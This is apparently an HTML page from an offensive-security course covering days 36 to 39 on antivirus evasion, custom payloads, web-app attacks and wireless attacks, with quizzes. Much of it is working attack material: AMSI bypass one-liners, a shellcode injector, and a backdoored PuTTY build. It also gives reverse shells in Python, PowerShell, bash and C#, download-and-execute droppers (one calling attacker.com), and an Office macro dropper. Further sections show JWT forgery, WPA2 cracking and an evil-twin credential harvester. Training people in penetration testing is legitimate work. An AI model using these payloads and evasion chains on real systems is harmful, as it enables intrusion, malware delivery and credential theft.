+    <p>AMSI (Antimalware Scan Interface) is a Windows API that intercepts PowerShell scripts, VBScript, and other scripting engine content before execution, passing it to the AV engine. Even <span class="hl">fileless attacks</span> that never touch disk are scanned. Bypassing AMSI means your PowerShell payloads run undetected.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">AMSI BYPASS TECHNIQUES</div></div>
+    <div class="tbody"><span class="co"># ── TECHNIQUE 1: Memory Patching (patch amsi.dll to return 0) ──
+# Overwrites AmsiScanBuffer function in memory to always return "clean"
+# Classic bypass — detections vary, often still works on unpatched systems</span>
+<span class="pr">PS></span> <span class="cm">$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)</span>
+<span class="co"># Obfuscated version of the amsiContext nullification bypass</span>
+
+<span class="co"># ── TECHNIQUE 2: String Concatenation (bypasses static AMSI scans) ──</span>
+<span class="ham">$am = 'Am'+'siUtils'</span>     <span class="co"># "AmsiUtils" as a string triggers AMSI detection</span>
+<span class="ham">$sc = 'Scan'+'Buffer'</span>    <span class="co"># Breaking strings defeats signature matching</span>
+<span class="co"># Concatenated strings are not matched by simple pattern search at scan time</span>
+
+<span class="co"># ── TECHNIQUE 3: PowerShell Downgrade Attack ──────────────────</span>
+<span class="pr">PS></span> <span class="cm">powershell -version 2 -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"</span>
+<span class="co"># PowerShell v2 doesn't support AMSI — if v2 is installed, it bypasses entirely
+# Windows 10/11 and hardened systems have v2 removed — check first</span>
+
+<span class="co"># ── TECHNIQUE 4: Invoke-Obfuscation (automated obfuscator) ───</span>
+<span class="pr">PS></span> <span class="cm">Import-Module Invoke-Obfuscation</span>
+<span class="pr">PS></span> <span class="cm">Invoke-Obfuscation</span>
+<span class="ha">OBFUSCATION TYPE: TOKEN</span>     <span class="co"># Randomizes variable names, adds junk, encodes</span>
+<span class="ha">SOURCE: /path/to/payload.ps1</span>
+<span class="co"># Output: heavily obfuscated script that passes AMSI but executes identically</span>
+
+<span class="co"># ── Evil-WinRM built-in bypass ────────────────────────────────</span>
+<span class="pr">*Evil-WinRM*</span> <span class="cm">Bypass-4MSI</span>    <span class="co"># One command — patches AMSI in the current session</span>
+<span class="hl2">[+] Patched!</span></div>
+  </div>
+
+  <div class="slbl">// 36.3 — PROCESS INJECTION</div>
+  <div class="card">
+    <div class="clbl">HIDING IN LEGITIMATE PROCESSES</div>
+    <p>Process injection writes shellcode into a legitimate, trusted process (explorer.exe, svchost.exe, notepad.exe) and executes it there. The AV sees legitimate processes doing suspicious things — much harder to detect than a standalone malicious executable. The memory never touches disk.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">PROCESS INJECTION — CLASSIC SHELLCODE LOADER (C)</div></div>
+    <div class="tbody"><span class="co">/* Classic VirtualAlloc + WriteProcessMemory + CreateRemoteThread injection
+   This is the conceptual pattern — real engagements use more sophisticated techniques */</span>
+
+<span class="ha">#include &lt;windows.h&gt;
+// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f c
+unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8...";</span>
+
+<span class="cm">int main() {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE,</span>
+    <span class="co">// Target PID — find explorer.exe: tasklist | findstr explorer</span>
+    <span class="cm">    4892);   // Explorer.exe PID</span>
+
+    <span class="co">// Allocate RWX memory in remote process</span>
+    <span class="cm">LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span>
+
+    <span class="co">// Write shellcode into remote process memory</span>
+    <span class="cm">WriteProcessMemory(hProc, mem, shellcode, sizeof(shellcode), NULL);</span>
+
+    <span class="co">// Create a thread in the remote process to execute shellcode</span>
+    <span class="cm">CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    return 0;
+}</span>
+
+<span class="co"># EDR detection: VirtualAllocEx with PAGE_EXECUTE_READWRITE is very suspicious
+# Modern bypass: RX memory first (write shellcode), then change to RX via VirtualProtect
+# Even better: use indirect syscalls to avoid hooking detection entirely</span>
+
+<span class="co"># ── Meterpreter migration (practical version) ────────────────</span>
+<span class="pr">meterpreter></span> <span class="cm">ps</span>   <span class="co"># Find stable SYSTEM process</span>
+<span class="hl2">4892  explorer.exe  x64  1  CORP\john.smith  C:\Windows\explorer.exe</span>
+<span class="pr">meterpreter></span> <span class="cm">migrate 4892</span>
+<span class="hl2">[+] Successfully migrated to process 4892</span>   <span class="co"># Now hiding in explorer.exe</span></div>
+  </div>
+
+  <div class="slbl">// 36.4 — MSFVENOM PAYLOAD ENCODING</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">MSFVENOM — EVASION-FOCUSED PAYLOAD GENERATION</div></div>
+    <div class="tbody"><span class="co"># Basic payload (gets caught immediately):</span>
+<span class="pr">$</span> <span class="cm">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o shell.exe</span>
+
+<span class="co"># Encoded payload (helps with static signatures):</span>
+<span class="pr">$</span> <span class="cm">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 \
+  -e x64/zutto_dekiru -i 10 \      </span><span class="co"># encoder, 10 iterations</span>
+<span class="cm">  -f exe -o encoded_shell.exe</span>
+
+<span class="co"># Embed in a legitimate executable (template substitution):</span>
+<span class="pr">$</span> <span class="cm">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 \
+  -x /usr/share/windows-resources/putty.exe \   </span><span class="co"># inject into PuTTY</span>
+<span class="cm">  -k \                                          </span><span class="co"># keep original functionality</span>
+<span class="cm">  -f exe -o putty_backdoored.exe</span>
+<span class="co"># Victim runs PuTTY normally — also gives you a shell</span>
+
+<span class="co"># PowerShell payload (fileless — never touches disk):</span>
+<span class="pr">$</span> <span class="cm">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 \
+  -f psh-reflection -o shell.ps1</span>
+<span class="pr">C:\></span> <span class="cm">powershell -ExecutionPolicy Bypass -File shell.ps1</span>
+
+<span class="co"># Check detection rate BEFORE delivery (VirusTotal alternative):</span>
+<span class="pr">$</span> <span class="cm">ln -s /usr/bin/python3 /usr/local/bin/python</span>
+<span class="pr">$</span> <span class="cm">pip install avred</span>
+<span class="pr">$</span> <span class="cm">avred shell.exe</span>   <span class="co"># checks against multiple AV without uploading to VirusTotal</span>
+<span class="co"># Never upload actual pentest payloads to VirusTotal — vendors add to signatures</span></div>
+  </div>
+
+  <div class="slbl">// DAY 36 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">Windows Defender catches your Meterpreter EXE immediately on disk. You switch to a PowerShell-based fileless payload, but AMSI catches that too. What is your next escalation in the evasion chain?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Encoding the EXE more times still produces a file on disk that Defender scans. Multi-iteration encoding helps with static signatures but not behavioral detection — and Defender has already shown it catches this.')"><span class="qk">A</span> Encode the EXE payload more iterations with shikata_ga_nai to bypass Defender</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Multi-layer approach: (1) Bypass AMSI first — use one of the in-memory patching techniques or string concatenation to disable AMSI in the current PowerShell session before running your payload. (2) Switch to a staged payload that downloads shellcode over HTTPS — the stager itself is clean, shellcode arrives in memory never touching disk. (3) Use process injection — inject into a trusted process (explorer.exe) rather than running your own executable. (4) Try a compiled C# or Go implant with custom strings — unique compilation means no signature match. (5) Use a legitimate C2 framework (Sliver/Havoc) whose implants are designed for EDR evasion. The layered approach: AMSI bypass → fileless staged delivery → process injection into trusted process.')"><span class="qk">B</span> Bypass AMSI first in memory, then deliver a staged payload that injects shellcode into a trusted process like explorer.exe — never running your own process</div>
+      <div class="qo" onclick="qa(this,'wrong','Disabling Defender requires admin rights — which you\'re trying to gain. Even if you had admin rights, disabling Defender creates an event log alert that SOC teams watch for specifically.')"><span class="qk">C</span> Disable Windows Defender via registry before delivering your payload</div>
+      <div class="qo" onclick="qa(this,'wrong','Smaller payloads help with some detection heuristics but Defender\'s AMSI integration catches content not size. The issue is what the payload does, not how big it is.')"><span class="qk">D</span> Use a smaller, simpler payload — Defender triggers on payload size</div>
+    </div>
+    <div class="qfb" id="q0"></div>
+  </div>
+</div><!-- /p0 -->
+
+
+<!-- ═══════════ DAY 37 ═══════════ -->
+<div class="pnl" id="p1">
+  <div class="dh">
+    <div class="dnum">37</div>
+    <div class="dinfo">
+      <h2>Custom Payload Development</h2>
+      <p><span class="stag stl">TOOL</span><span class="stag slb">LAB</span> msfvenom Advanced · Python/C# Reverse Shells · Staged Delivery · Droppers</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 6 PROGRESS — DAY 37 OF 42</div><div class="pbt"><div class="pbf" style="width:88%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🔧</div>
+    <p><strong>Custom payloads evade AV because they have no signatures.</strong> Every msfvenom output with default settings is known to AV vendors. When you write your own reverse shell from scratch — even in Python or C# — AV has no signature for it. Understanding how reverse shells work at the socket level means you can write one in any language, customize it for any environment, and adapt when defenses block you.</p>
+  </div>
+
+  <div class="slbl">// 37.1 — REVERSE SHELL ANATOMY</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">CUSTOM REVERSE SHELLS FROM SCRATCH</div></div>
+    <div class="tbody"><span class="co"># ── PYTHON REVERSE SHELL (cross-platform) ────────────────────</span>
+<span class="ha">import socket, subprocess, os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.56.100", 4444))   # attacker IP and port
+
+# Redirect stdin/stdout/stderr to the socket
+os.dup2(s.fileno(), 0)   # stdin
+os.dup2(s.fileno(), 1)   # stdout
+os.dup2(s.fileno(), 2)   # stderr
+
+# Launch interactive shell
+subprocess.call(["/bin/bash", "-i"])</span>
+<span class="co"># Run on target: python3 shell.py
+# On Kali: nc -lvnp 4444  ← receives the connection</span>
+
+<span class="co"># ── POWERSHELL ONE-LINER (Windows, fileless) ──────────────────</span>
+<span class="ha">$c=New-Object Net.Sockets.TCPClient("192.168.56.100",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$r=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($r,0,$r.Length)}</span>
+
+<span class="co"># ── BASH ONE-LINER (Linux target) ────────────────────────────</span>
+<span class="ha">bash -i >& /dev/tcp/192.168.56.100/4444 0>&1</span>
+<span class="co"># /dev/tcp is a bash feature — redirects I/O to a TCP socket</span>
+
+<span class="co"># ── C# REVERSE SHELL (compiles to EXE, unique signature) ─────</span>
+<span class="ha">using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Diagnostics;
+
+class Shell {
+    static void Main() {
+        var client = new TcpClient("192.168.56.100", 4444);
+        var stream = client.GetStream();
+        var buf = new byte[4096];
+        while (true) {
+            int n = stream.Read(buf, 0, buf.Length);
+            var cmd = Encoding.ASCII.GetString(buf, 0, n).Trim();
+            var p = Process.Start(new ProcessStartInfo("cmd.exe","/c "+cmd){
+                RedirectStandardOutput=true, UseShellExecute=false
+            });
+            var out_ = p.StandardOutput.ReadToEnd();
+            var resp = Encoding.ASCII.GetBytes(out_);
+            stream.Write(resp, 0, resp.Length);
+        }
+    }
+}</span>
+<span class="co"># Compile: mcs -out:shell.exe shell.cs (on Kali with Mono)
+# Or on Windows: csc.exe shell.cs</span></div>
+  </div>
+
+  <div class="slbl">// 37.2 — STAGED DELIVERY WITH DROPPER</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">DROPPER PATTERN — TWO-STAGE DELIVERY</div></div>
+    <div class="tbody"><span class="co"># Stage 1: Tiny "dropper" — barely any code, no malicious signatures
+# Downloads and executes the actual payload in memory</span>
+
+<span class="co"># PowerShell dropper (sent in phishing email / macro):</span>
+<span class="ha">IEX(New-Object Net.WebClient).DownloadString("https://192.168.56.100/stage2.ps1")</span>
+<span class="co"># Dropper itself has no malicious content — just a download and execute
+# AV sees: download a string and execute it — suspicious but not flagged if AMSI bypassed</span>
+
+<span class="co"># Stage 2: Full payload served from your HTTPS server (stays in memory)</span>
+
+<span class="co"># ── Set up your payload server ────────────────────────────────</span>
+<span class="pr">kali$</span> <span class="cm">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=updates.microsoft.com"</span>
+<span class="pr">kali$</span> <span class="cm">python3 -c "
+import http.server, ssl
+httpd = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='key.pem', certfile='cert.pem', server_side=True)
+httpd.serve_forever()"</span>
+<span class="co"># HTTPS server with self-signed cert — traffic is encrypted, content not inspectable by network AV</span>
+
+<span class="co"># ── HTA dropper (HTML Application — opens via browser/email) ──</span>
+<span class="pr">kali$</span> <span class="cm">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.100 LPORT=443 -f hta-psh -o update.hta</span>
+<span class="co"># Victim double-clicks update.hta → runs as script → HTTPS meterpreter session</span>
+
+<span class="co"># ── Macro dropper concept (Word/Excel) ───────────────────────
+# Office macro VBA:
+Sub AutoOpen()
+    Dim x As String
+    x = "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('https://192.168.56.100/payload.ps1')"
+    Shell x
+End Sub</span></div>
+  </div>
+
+  <div class="slbl">// DAY 37 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You need to deliver a payload to a target machine where PowerShell execution policy is set to <code>Restricted</code> (no scripts allowed), AMSI is active, and outbound traffic on unusual ports is blocked. Only ports 80 and 443 outbound are open. What delivery approach do you use?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Set-ExecutionPolicy requires admin rights, and changing policy creates event log entries. Also, the execution policy restriction needs to be bypassed, not changed.')"><span class="qk">A</span> Run Set-ExecutionPolicy Bypass first, then execute your script normally</div>
+      <div class="qo" onclick="qa(this,'wrong','Port 4444 is blocked outbound — your standard reverse TCP shell won\'t work. You need to use the allowed outbound ports (443) for C2 communications.')"><span class="qk">B</span> Use a standard msfvenom EXE with reverse_tcp on port 4444</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Multi-constraint solution: (1) Bypass execution policy without changing it: powershell -ExecutionPolicy Bypass -c "..." (command-line flag, no admin needed, no log change) OR encode the command in Base64: powershell -EncodedCommand [base64]. (2) Bypass AMSI inline before your payload. (3) Use HTTPS (port 443) for C2 — specifically msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.100 LPORT=443. This uses the allowed port and encrypts the C2 channel. (4) Combine: powershell -ExecutionPolicy Bypass -EncodedCommand [AMSI_bypass+dropper_encoded] where the dropper downloads the HTTPS Meterpreter payload. Each constraint requires a specific bypass, layered together.')"><span class="qk">C</span> Use -ExecutionPolicy Bypass flag (no admin needed), HTTPS Meterpreter on port 443, and encode the dropper command in Base64 to avoid inline AMSI scanning</div>
+      <div class="qo" onclick="qa(this,'wrong','Phishing assumes no physical/logical access at all. If you need to deliver a payload to an already-targeted machine, a phishing email adds unnecessary complexity and social engineering risk.')"><span class="qk">D</span> Send a phishing email with a macro attachment — it bypasses all restrictions</div>
+    </div>
+    <div class="qfb" id="q1"></div>
+  </div>
+</div><!-- /p1 -->
+
+
+<!-- ═══════════ DAY 38 ═══════════ -->
+<div class="pnl" id="p2">
+  <div class="dh">
+    <div class="dnum">38</div>
+    <div class="dinfo">
+      <h2>Advanced Web App Security</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> JWT Attacks · OAuth Abuse · GraphQL · API Security · Race Conditions</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 6 PROGRESS — DAY 38 OF 42</div><div class="pbt"><div class="pbf" style="width:90%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🔑</div>
+    <p><strong>Modern web apps have moved beyond OWASP Top 10 basics.</strong> JWT tokens, OAuth flows, GraphQL introspection, REST API versioning flaws, and race conditions are the frontier of web security. These appear in almost every modern SaaS product, mobile app backend, and microservices architecture — and they're where the big bug bounty payouts live.</p>
+  </div>
+
+  <div class="slbl">// 38.1 — JWT ATTACKS</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">JWT VULNERABILITIES — ANALYSIS AND EXPLOITATION</div></div>
+    <div class="tbody"><span class="co"># JWT structure: header.payload.signature (base64url encoded, dot-separated)
+# Decode any JWT at jwt.io or:</span>
+<span class="pr">$</span> <span class="cm">echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d</span>
+<span class="ha">{"alg":"HS256","typ":"JWT"}</span>
+
+<span class="pr">$</span> <span class="cm">echo "eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ" | base64 -d</span>
+<span class="ha">{"sub":"user123","role":"user"}</span>
+
+<span class="co"># ── ATTACK 1: Algorithm = "none" (no signature verification) ──</span>
+<span class="hc"># Change alg to "none", set role to "admin", remove signature</span>
+<span class="ha">Header: {"alg":"none","typ":"JWT"}
+Payload: {"sub":"user123","role":"admin"}
+Signature: (empty)</span>
+<span class="co"># Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.
+# If server accepts alg:none → no signature checked → admin access!</span>
+
+<span class="co"># ── ATTACK 2: Weak secret brute-force ─────────────────────────</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 16500 jwt_token.txt rockyou.txt</span>
+<span class="co"># Hashcat mode 16500 = JWT cracking
+# If secret is "secret", "password", or weak → you can forge any token</span>
+<span class="ham"># Cracked: eyJ...   → secret: "supersecret123"</span>
+<span class="co"># Now forge: {"sub":"admin","role":"admin"} signed with same secret</span>
+
+<span class="co"># ── ATTACK 3: RS256 to HS256 algorithm confusion ──────────────</span>
+<span class="co"># Server uses RS256 (RSA) and publishes its public key at /jwks.json
+# Trick: switch alg to HS256, sign with the PUBLIC KEY as HMAC secret
+# Server verifies HS256 using its public key → accepts your forged token!</span>
+<span class="pr">$</span> <span class="cm">python3 jwt_confusion.py --jwt "[token]" --pubkey public.pem --claim role=admin</span>
+
+<span class="co"># ── ATTACK 4: JWK header injection ────────────────────────────</span>
+<span class="co"># Add "jwk" parameter to JWT header with YOUR OWN public key
+# Sign the token with your private key
+# Vulnerable servers use the embedded key to verify → you verified yourself!</span></div>
+  </div>
+
+  <div class="slbl">// 38.2 — GRAPHQL SECURITY TESTING</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">GRAPHQL ENUMERATION AND ATTACK</div></div>
+    <div class="tbody"><span class="co"># GraphQL uses a single endpoint — POST /graphql or /api/graphql
+# Introspection query reveals the entire schema (often enabled in production!)</span>
+<span class="pr">$</span> <span class="cm">curl -X POST http://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name fields{name}}}}"}'</span>
+
+<span class="ha"># Returns ALL types and fields in the GraphQL schema:
+# → User type: id, email, password, creditCard, ssn, adminNotes
+# → Mutation: deleteUser, promoteToAdmin, resetPassword
+# Fields not shown in UI but exposed in schema = IDOR targets</span>
+
+<span class="co"># ── Query hidden fields ────────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
+  -d '{"query":"query{user(id:1){id email password ssn creditCard}}"}'</span>
+<span class="ha">{"data":{"user":{"id":1,"email":"admin@corp.com","password":"$2b$12$...","ssn":"123-45-6789","creditCard":"4111111111111111"}}}</span>
+
+<span class="co"># ── Batch query attack (bypass rate limiting) ─────────────────</span>
+<span class="cm">[{"query":"mutation{login(email:\"admin@corp.com\",password:\"password1\")}"},
+ {"query":"mutation{login(email:\"admin@corp.com\",password:\"password2\")}"},
+ ...999 more passwords in same request]</span>
+<span class="co"># GraphQL batching: 1000 login attempts = 1 HTTP request → bypasses per-request rate limits</span>
+
+<span class="co"># ── Tool: graphw00f (GraphQL fingerprinting) ──────────────────</span>
+<span class="pr">$</span> <span class="cm">graphw00f -d -t http://target.com/graphql</span>
+<span class="co"># ── Tool: clairvoyance (schema recovery even with introspection disabled) ──</span>
+<span class="pr">$</span> <span class="cm">clairvoyance http://target.com/graphql -w wordlist.txt -o schema.json</span></div>
+  </div>
+
+  <div class="slbl">// 38.3 — RACE CONDITIONS</div>
+  <div class="card">
+    <div class="clbl">EXPLOITING TIMING FLAWS</div>
+    <p>Race conditions occur when an application performs a check-then-act operation that isn't atomic. Between the check (is this coupon valid?) and the act (apply discount), another request can sneak through. Send 50 simultaneous requests to use a single-use coupon 50 times. Burp Suite's Turbo Intruder is purpose-built for this.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">RACE CONDITION — BURP TURBO INTRUDER</div></div>
+    <div class="tbody"><span class="co"># Classic scenario: single-use gift card code, but no atomic DB transaction</span>
+<span class="co"># Burp Turbo Intruder script for race condition:</span>
+<span class="ha">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+        concurrentConnections=50,    # 50 parallel connections
+        requestsPerConnection=1,
+        pipeline=False)
+
+    for i in range(50):              # Send 50 identical requests
+        engine.queue(target.req, pauseTime=0)
+
+def handleResponse(req, interesting):
+    if "discount applied" in req.response:
+        table.add(req)</span>
+
+<span class="co"># All 50 requests hit the server simultaneously
+# Some race past the "already used" check before DB is updated
+# Coupon applied 50 times → $50 discount used as $2,500 discount</span>
+
+<span class="co"># Also test: bank transfers (double-spend), account balance checks,
+# file upload race (upload+execute before AV scans), OTP reuse</span></div>
+  </div>
+
+  <div class="slbl">// DAY 38 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You find a JWT token used for API authentication. The header shows <code>{"alg":"HS256"}</code> and the payload shows <code>{"user_id":1042,"role":"user"}</code>. Changing <code>role</code> to <code>admin</code> and sending with a random signature returns 401. What are your next two steps in order?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Sending more requests with random signatures won\'t help — the server correctly validates HS256 signatures. You need either the secret or a different attack.')"><span class="qk">A</span> Send 1000 requests with different random signatures — brute-force the signature check</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Step 1: Crack the HMAC secret with Hashcat mode 16500 using rockyou.txt. HS256 requires a secret key — if it\'s weak (common: "secret", "key", "password", app name) it\'s crackable. A cracked secret lets you sign ANY payload. Step 2: If cracking fails, try the "alg:none" attack — change header to {"alg":"none"} and remove the signature entirely (keep trailing dot). Some libraries that support alg:none for testing forget to disable it in production. If both fail: try RS256 confusion (if the server publishes a public key), JWK injection, or look for a JWT library vulnerability. Always: check jwt_tool\'s --crack flag which automates both attacks.')"><span class="qk">B</span> Crack the HMAC secret with Hashcat mode 16500 (rockyou.txt), then if that fails try changing alg to "none" and removing the signature</div>
+      <div class="qo" onclick="qa(this,'wrong','Sending without a signature entirely (no trailing data) is different from alg:none attack. You need the header to specify alg:none AND provide an empty signature field (dot at end).')"><span class="qk">C</span> Remove the signature section entirely and send the two-part token</div>
+      <div class="qo" onclick="qa(this,'wrong','RS256/RS512 confusion attack applies when the server uses RSA asymmetric signing (RS256) and you switch to HS256 using the public key. The token already uses HS256, so this attack doesn\'t apply here.')"><span class="qk">D</span> Switch alg to RS256 — the server must have a public key you can exploit</div>
+    </div>
+    <div class="qfb" id="q2"></div>
+  </div>
+</div><!-- /p2 -->
+
+
+<!-- ═══════════ DAY 39 ═══════════ -->
+<div class="pnl" id="p3">
+  <div class="dh">
+    <div class="dnum">39</div>
+    <div class="dinfo">
+      <h2>Wireless Security</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> WPA2 Cracking · Evil Twin · Deauthentication · Captive Portals · Aircrack-ng</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 6 PROGRESS — DAY 39 OF 42</div><div class="pbt"><div class="pbf" style="width:92%"></div></div></div>
+
+  <div class="note nw">
+    <div class="nico">📡</div>
+    <p><strong>Wireless attacks bridge the physical and digital worlds.</strong> A locked server room means nothing if an attacker sitting in the parking lot can join the corporate Wi-Fi. WPA2 cracking, evil twin access points, and PMKID attacks give unauthenticated network access. Requires a wireless adapter supporting monitor mode and packet injection — use an Alfa AWUS036ACH or similar.</p>
+  </div>
+
+  <div class="slbl">// 39.1 — WPA2 ATTACK CHAIN</div>
+  <div class="wflow">
+    <div class="wstep">
+      <div class="ws-n">1</div>
+      <div class="ws-b">
+        <div class="ws-title">Enable Monitor Mode</div>
+        <div class="ws-desc">Put your wireless adapter into monitor mode — captures all wireless frames, not just those addressed to you. Kill interfering processes first.</div>
+        <div class="ws-cmd">airmon-ng check kill && airmon-ng start wlan0</div>
+      </div>
+    </div>
+    <div class="wstep">
+      <div class="ws-n">2</div>
+      <div class="ws-b">
+        <div class="ws-title">Survey Networks</div>
+        <div class="ws-desc">List all visible networks — BSSID (AP MAC), ESSID (network name), channel, encryption type, number of clients. Target networks with connected clients.</div>
+        <div class="ws-cmd">airodump-ng wlan0mon</div>
+      </div>
+    </div>
+    <div class="wstep">
+      <div class="ws-n">3</div>
+      <div class="ws-b">
+        <div class="ws-title">Target and Capture</div>
+        <div class="ws-desc">Lock onto your target network and capture all its packets. Wait for a 4-way WPA2 handshake (when a client connects) — the handshake contains the crackable material.</div>
+        <div class="ws-cmd">airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</div>
+      </div>
+    </div>
+    <div class="wstep">
+      <div class="ws-n">4</div>
+      <div class="ws-b">
+        <div class="ws-title">Deauthentication Attack</div>
+        <div class="ws-desc">Force a connected client to disconnect — they reconnect automatically, triggering a new handshake you capture. Faster than waiting organically.</div>
+        <div class="ws-cmd">aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon</div>
+      </div>
+    </div>
+    <div class="wstep">
+      <div class="ws-n">5</div>
+      <div class="ws-b">
+        <div class="ws-title">Crack the Handshake</div>
+        <div class="ws-desc">The WPA2 handshake is a PBKDF2-HMAC-SHA1 hash of the passphrase. Offline dictionary attack — fast with GPU. Crack with Hashcat mode 22000 or aircrack-ng.</div>
+        <div class="ws-cmd">hashcat -m 22000 capture.hc22000 rockyou.txt -r OneRuleToRuleThemAll.rule</div>
+      </div>
+    </div>
+    <div class="wstep">
+      <div class="ws-n">6</div>
+      <div class="ws-b">
+        <div class="ws-title">PMKID Attack (no client needed)</div>
+        <div class="ws-desc">Modern alternative — extract the PMKID directly from the AP beacon without waiting for a client handshake. Works on most modern routers.</div>
+        <div class="ws-cmd">hcxdumptool -i wlan0mon -o capture.pcapng && hcxpcapngtool capture.pcapng -o hash.hc22000</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="slbl">// 39.2 — EVIL TWIN ATTACK</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">EVIL TWIN — ROGUE ACCESS POINT WITH CAPTIVE PORTAL</div></div>
+    <div class="tbody"><span class="co"># Evil Twin: create a fake AP with same SSID as target network
+# Force clients off real AP (deauth), they connect to your AP instead
+# Your AP: internet access via your 4G → victims work normally
+# But all traffic flows through you → MITM the entire network</span>
+
+<span class="co"># ── Step 1: Create AP with hostapd ────────────────────────────</span>
+<span class="pr">#</span> <span class="cm">/etc/hostapd/hostapd.conf:</span>
+<span class="ha">interface=wlan0mon
+ssid=CorporateWiFi     # Exact same SSID as target
+hw_mode=g
+channel=6
+wpa=0                  # Open network — no password (clients connect automatically)</span>
+
+<span class="pr">#</span> <span class="cm">hostapd /etc/hostapd/hostapd.conf &</span>
+
+<span class="co"># ── Step 2: DHCP server for clients ──────────────────────────</span>
+<span class="pr">#</span> <span class="cm">dnsmasq --interface=wlan0mon --dhcp-range=192.168.2.10,192.168.2.50 --dhcp-option=3,192.168.2.1</span>
+
+<span class="co"># ── Step 3: Captive portal (credential harvesting) ────────────
+# Serve a fake login page at your gateway IP
+# Looks identical to corporate SSO login
+# Victim enters credentials → you capture them → redirect to real site</span>
+<span class="pr">#</span> <span class="cm">iptables -t nat -A PREROUTING -i wlan0mon -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:80</span>
+
+<span class="co"># ── Step 4: Intercept HTTPS (SSLStrip if HSTS not set) ────────</span>
+<span class="pr">#</span> <span class="cm">bettercap -iface wlan0mon -eval "net.probe on; arp.spoof on; net.sniff on"</span>
+
+<span class="co"># ── Automated: Wifiphisher (all-in-one evil twin tool) ────────</span>
